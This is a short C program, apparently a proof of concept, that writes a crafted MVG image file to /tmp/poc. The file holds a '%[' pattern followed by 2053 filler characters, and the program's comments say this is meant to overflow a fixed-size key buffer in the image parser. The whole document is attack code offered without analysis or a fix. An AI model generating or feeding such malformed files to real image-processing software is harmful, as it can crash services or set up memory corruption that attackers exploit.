#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* MVG header */
    fprintf(f, "viewbox 0 0 100 100\n");
    fprintf(f, "fill black\n");
    /* The %[...] pattern directly — no text command wrapper */
    fputc('%', f);
    fputc('[', f);
    /* Write exactly MaxTextExtent (2053) characters to overflow key buffer */
    for (int i = 0; i < 2053; i++) {
        fputc('A', f);
    }
    fputc(']', f);
    fputc('\n', f);

    fclose(f);
    return 0;
}